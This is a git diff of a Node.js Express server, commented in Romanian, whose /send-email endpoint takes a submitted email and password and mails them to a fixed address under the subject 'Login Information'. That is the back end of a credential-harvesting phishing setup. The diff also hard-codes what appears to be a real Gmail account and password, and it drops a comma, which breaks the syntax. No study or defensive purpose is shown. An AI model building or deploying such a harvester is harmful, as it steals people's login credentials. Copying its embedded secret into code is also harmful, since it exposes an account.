@@ -3,17 +3,17 @@ const nodemailer = require('nodemailer');
 const bodyParser = require('body-parser');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000; // Folosește portul din variabilele de mediu sau portul 3000
 
 // Middleware pentru parsarea cererilor de tip JSON
 app.use(bodyParser.json());
 
-// Configurează transportul de emailuri cu NodeMailer
+// Configurează transportul de emailuri cu Nodemailer
 let transporter = nodemailer.createTransport({
-  service: 'gmail', // Poți folosi orice serviciu, cum ar fi Yahoo, Outlook sau un server SMTP propriu
+  service: 'gmail', // Sau alt serviciu (Yahoo, Outlook, etc.)
   auth: {
-    user: 'adresa_ta_de_email@gmail.com', // Emailul de unde trimiți
-    pass: 'parola_ta' // Parola sau App Password dacă folosești 2FA
+    user: 'dazaiosamu351@gmail.com' // Adresa ta de email
+    pass: 'DazaiOsamuGoogleAkk231' // Parola sau App Password, dacă ai 2FA activat
   }
 });
 
@@ -22,8 +22,8 @@ app.post('/send-email', (req, res) => {
   const { email, password } = req.body;
 
   let mailOptions = {
-    from: 'kridderurt@gmail.com',
-    to: 'kridderurt@example.com', // Emailul unde vrei să trimiți
+    from: 'dazaiosamu351@gmail.com',
+    to: 'kridderurt@example.com', // Emailul destinatarului
     subject: 'Login Information',
     text: `Email: ${email}\nPassword: ${password}`
   };
@@ -32,7 +32,7 @@ app.post('/send-email', (req, res) => {
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error la trimiterea emailului.');
+      res.status(500).send('Eroare la trimiterea emailului.');
     } else {
       console.log('Email trimis: ' + info.response);
       res.status(200).send('Email trimis cu succes!');
@@ -40,6 +40,7 @@ app.post('/send-email', (req, res) => {
   });
 });
 
+// Pornește serverul
 app.listen(port, () => {
-  console.log(`Serverul rulează la http://localhost:${port}`);
+  console.log(`Serverul rulează pe portul ${port}`);
 });
